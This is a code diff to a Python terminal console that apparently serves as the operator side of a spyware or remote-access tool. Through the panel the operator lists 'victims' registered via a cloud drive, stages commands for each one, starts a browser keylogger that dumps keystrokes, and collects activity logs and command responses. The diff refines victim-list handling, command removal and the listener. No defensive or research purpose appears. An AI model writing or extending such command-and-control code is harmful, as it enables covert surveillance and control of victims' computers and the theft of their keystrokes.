@@ -145,6 +145,10 @@ def clear():
     window.clear()
     window.refresh()
 
+def update_list(lst, iterable):
+    no_dub=set(lst)|set(iterable)
+    lst.clear()
+    lst.extend(no_dub)
 
 victims=[]
 
@@ -191,11 +195,13 @@ class Home:
         #     self.page:{
         #         self.selected:[y, x, name]
         #     }
-        # }# caching        
+        # }# caching
+        self.on_home_page=True
 
     def show(self):# main function
         window.keypad(1)
         self.refresh()
+        self.resize()
 
         while 1:
             key=window.getch()
@@ -276,6 +282,7 @@ class Home:
 
         self.calculate()
         self.print_page()
+
         
     def print_page(self):
         ''' self.calculate must be run before '''
@@ -304,9 +311,10 @@ class Home:
 
     def enter(self):
         self.print_status(0)
+        self.on_home_page=False
         action(self.selected_name)
         self.resize()
-
+        self.on_home_page=True
 
     def up(self):
         if self.selected[1]==1:
@@ -346,6 +354,7 @@ class Home:
         self.selected[0]+=1
         self.color()
 
+    
     @property
     def selected_name(self):
         '''1 indexed c: column and r: row'''
@@ -409,38 +418,39 @@ class Home:
                 log.error('No previous cached user list found.')
             else:
                 log.warning("showing cached victims name")
-            
-            self.resize()
             return
     
-        lst = source_drive.list_files(vic_path)# list source drive
-        if not lst:
+        new_victims = source_drive.list_files(vic_path)# list source drive
+        if not new_victims:
             return
-        log.info(f'auto refresh found {len(lst)} new active victims.')
         
-        lst=set(victims)|set(lst)
-        victims.clear()
-        victims.extend(lst)
-        
-        # move registered file to the host
-        for i in lst:
-            move_file(join(vic_path, i))
-        
-        # move files that uploaded when ever a victims got actime
-        for user in victims:
+        log.info(f'auto refresh found {len(new_victims)} new active victims.')
+        for uname in new_victims:
+            # move registered file to the host
+            upath=join(vic_path, uname)
+            move_file(upath)
+            with drive_file(upath) as f:# repair command_sec if needed
+                command_sec=json.loads(f.read())['last_user_time']
+                if last_time[uname]<command_sec:
+                    last_time[uname]=command_sec
+                    log.warning(f'0_o repaired wrong command_sec for victim: {uname}')
+            
+            # move files that uploaded when ever a victims got actime
             file = "activity.log"
-            file = f"reports/{user}/{file}"
+            file = f"reports/{uname}/{file}"
             move_file(file)
 
-        self.resize()
+        update_list(victims, new_victims)
+        
+        if self.on_home_page:
+            self.resize()
     
     def secure(self):
         if _d.secure_mod:
             token_provider.start()
         else:
             token_provider.stop()
-
-        self.print_status()
+            self.print_status()
 
     def test(self):
         while 1:
@@ -457,14 +467,14 @@ def remove_command(uname, ctime):
         uname:str = victim_user_name
         ctime:str or int = command_(secquence or id or time)
     '''
-    ctime=str(ctime)
+    ctime=int(ctime)
     modify_command.acquire()
     with drive_file(command_file) as f:
-        commands:list = json.loads(f.read())[uname]
+        commands:list = json.loads(f.read())
     
-    for command in commands:
+    for command in commands[uname]:
         if command['time']==ctime:
-            commands.remove(command)
+            commands[uname].remove(command)
             break
     else:
         log.debug(f'listd command({uname}-{ctime}) already removed')
@@ -473,13 +483,14 @@ def remove_command(uname, ctime):
 
     with drive_file(command_file) as f:
         f.rewrite(commands)
+    log.info(f'removed command {uname}-{ctime}')
     modify_command.release()
 
 def listener():
     while 1:
         home_page.refresh()
         for user in victims:
-            response=join(user, 'response')
+            response=f"reports/{user}/response"
             for ctime in source_drive.list_files(response):
                 remove_command(uname, ctime)
                 move_file(join(response, ctime))
@@ -547,6 +558,7 @@ class Tokener:
         log.debug('token received from the bucket')
         if _d.secure_mod:
             log.info("auto refresh activated. please wait for the victims to register their names.")
+            home_page.print_status()
             self.listen.start()
             _d.secure_mod=False
         
@@ -629,9 +641,6 @@ class Option_view:
         
         self.position=middle_print_lst(self.opt_win, self.opt_lst, self.step)
         self.color()
-
-        # self.opt_win.refresh()
-        # self.opt_win.getch()
 
     def up(self):
         if self.cursor!=0:
@@ -719,6 +728,7 @@ class action:
         self.vic_name = vic_name
         self.last_time = last_time.get(vic_name, 0)
         self.commands=[]# also this one # previous command that is not responsed
+        self.listen_for=[]
         
         clear()
         sh, sw = window.getmaxyx()
@@ -744,7 +754,7 @@ class action:
             "set_value": [self.set_value, "change a value of stored key in data_store.", ],
             "start_logger": [self.start_logger, 'start a browser spacefic key logger.[reports: key_dump.log]', ],
             "discard": [self.discard, "discard staged commands."],
-            "clean_recoed":[self.clean_record, "remove user name with all listed commands from command file."]
+            "clean_recoed":[self.clean_record, "remove user name with all listed commands from command file  but it doesn\'t discard the staged commands."]
         })
         opt_viewer=Option_view(self.all_command, opt_win)
         opt_viewer.on_selection=self.print_des
@@ -812,9 +822,6 @@ class action:
         }
         
         self.stage(command)
-        # this might create proablem depending on it's position during execution
-        # if key=="last_user_time":# this must be happen after staging
-        #     self.last_time=int(p)
         clear()
 
     def start_logger(self):
@@ -844,10 +851,10 @@ class action:
     def discard(self):
         log.warning('all changes resolved.')
         self.commands.clear()
+        self.listen_for.clear()
 
     def clean_record(self):
-        log.warning('all listed commands removed from the command file\
-         but it doesn\'t discard the staged commands.')
+        log.warning('all listed commands removed from command_file')
         with drive_file(command_file) as f, modify_command:
             
             full_com:dict=json.loads(f.read() or "{}")
@@ -855,15 +862,11 @@ class action:
             f.rewrite(full_com)
 
 
-    def add_to_listen(self, file_name:str):
-        path=join("reports", self.vic_name)
-        
-        # name, _, ext=name.rpartition(".")
-        # path = join(path, f"{name}_{self.last_time}.{ext}")
+    def add_to_listen(self, file_name:str, prefix="reports"):
+        path=join(prefix, self.vic_name)
         path=join(path, file_name)
-        with modify_command:
-            listen_for.append(path)
-            data_store.commit()
+        self.listen_for.append(path)
+
 
     def included(self, command):
         for i in self.commands:
@@ -906,12 +909,11 @@ class action:
 
             self.extend(pre_com)
             full_com[self.vic_name]=self.commands
-
             f.rewrite(full_com)
 
-        last_time[self.vic_name]=self.last_time
-        data_store.commit()
-        self.commands.clear()
+            last_time[self.vic_name]=self.last_time
+            update_list(listen_for, self.listen_for)
+            data_store.commit()
         return
 
 
@@ -919,7 +921,7 @@ class action:
 if __name__=="__main__":
     victims = ["".join(random.choices(string.ascii_lowercase, k=20)) for i in range(8)]
     # action(0)
-    home_page = Home()
+    # home_page = Home()
     home_page.show()
     # Home().test()
 
